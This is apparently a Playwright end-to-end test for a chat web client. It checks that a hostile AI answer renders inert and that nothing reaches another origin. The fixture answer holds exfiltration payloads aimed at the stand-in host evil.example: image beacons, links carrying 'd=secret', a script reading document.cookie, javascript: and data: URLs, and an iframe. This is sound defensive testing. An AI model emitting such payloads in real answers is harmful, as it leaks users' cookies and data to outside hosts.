// `exfiltration.spec.ts` (T-380; 10-web-client.md sections 9 and 8.17, acceptance criteria 33 and
// 34, 82-security.md SEC-39 to SEC-41): a hostile answer from the stub renders inert. Nothing on
// the page or in a copied answer reaches another origin, every refused URL reads
// `[link removed]`, and only the allowlisted link is a link.

import { citation, IDS } from "../../fixtures/web/stub-api/builders.ts";
import { APP_ORIGIN, CONTROL_ORIGIN } from "../../fixtures/web/stub-api/protocol.ts";
import { en, expect, expectAccessible, test } from "../../fixtures/web/test.ts";

const HOSTILE_ANSWER = [
  "Here is what the policy says ⟦1⟧.",
  "",
  "![x](https://evil.example/p.png)",
  "",
  "<img src=https://evil.example/p.png>",
  "",
  "<script>window.stolen = document.cookie</script>",
  "",
  "Read [a](https://evil.example/?d=secret), https://evil.example/x?d=secret, www.evil.example " +
    "or <https://evil.example>.",
  "",
  "See [ref][r], [js](javascript:alert(1)) and [data](data:text/html,hi).",
  "",
  '<iframe src="https://evil.example/f"></iframe>',
  "",
  "A note[^1] and the [handbook](https://docs.example/a).",
  "",
  "- [x] done",
  "- [ ] open",
  "",
  "[r]: https://evil.example/r",
  "[^1]: The footnote.",
].join("\n");

const QUESTION = "What does the policy say?";

test("T-380 a hostile answer renders inert and nothing reaches another origin", async ({
  app,
  page,
  context,
  stub,
  gates,
  browserName,
}) => {
  const evil: string[] = [];
  await context.route(/^https?:\/\/([^/]*\.)?evil\.example(\/|$)/, async (route) => {
    evil.push(route.request().url());
    await route.abort();
  });
  if (browserName === "chromium") {
    for (const origin of [APP_ORIGIN, CONTROL_ORIGIN]) {
      await context.grantPermissions(["clipboard-read", "clipboard-write"], { origin });
    }
  }
  await stub.stream({
    answer: HOSTILE_ANSWER,
    citations: [citation(1, "Leave policy", 4)],
    allowedLinks: ["https://docs.example/a"],
    followups: [],
  });
  await app.openShell(`/chat?project=${IDS.handbook}`);
  await app.ask(QUESTION);
  const answer = app.turn(QUESTION);
  await expect(app.sources(answer)).toBeVisible();

  // The rendered HTML: no image, script, frame, input, style or src, and exactly one link.
  await expect(answer.locator("img, script, iframe, input, style, [src]")).toHaveCount(0);
  const links = answer.locator("a");
  await expect(links).toHaveCount(1);
  await expect(links).toHaveAttribute("href", "https://docs.example/a");
  await expect(links).toHaveAttribute("rel", "noopener noreferrer");
  await expect(links).toHaveAttribute("target", "_blank");
  await expect(answer.locator("[data-link-host]")).toHaveText(" (docs.example)");

  // Every refused URL shows as the marker, and the page's text holds none of them.
  const markers = answer.getByText(en["chat.turn.linkRemoved"], { exact: false });
  expect(await markers.count()).toBeGreaterThan(0);
  const text = await page.locator("body").innerText();
  expect(text).not.toContain("evil.example");
  expect(text).not.toContain("d=secret");
  expect(await page.evaluate(() => "stolen" in window)).toBe(false);
  await expectAccessible(page, "the hostile answer");

  // Clicking the marker navigates nowhere.
  const before = page.url();
  const pages = context.pages().length;
  await markers.first().click();
  await page.waitForTimeout(500);
  expect(page.url()).toBe(before);
  expect(context.pages()).toHaveLength(pages);

  // Copy answer writes the redacted plain text.
  await answer.getByRole("button", { name: en["chat.turn.copy"] }).click();
  await expect(app.statusRegion()).toHaveText(en["chat.turn.copied"]);
  if (browserName === "chromium") {
    // The site's Permissions-Policy denies it clipboard-read, so the copy is read back from a
    // page on the stub's control origin.
    const reader = await gates.helperPage();
    await reader.bringToFront();
    const copied = await reader.evaluate(() => navigator.clipboard.readText());
    expect(copied).toContain(en["chat.turn.linkRemoved"]);
    expect(copied).toContain("handbook (https://docs.example/a)");
    expect(copied).not.toContain("evil.example");
    await reader.close();
  } else {
    test.info().annotations.push({
      type: "clipboard",
      description: "Only Chromium lets a test read the clipboard back; the copy was confirmed.",
    });
  }

  expect(evil).toEqual([]);
  expect(gates.requests.filter((request) => request.includes("evil.example"))).toEqual([]);
});
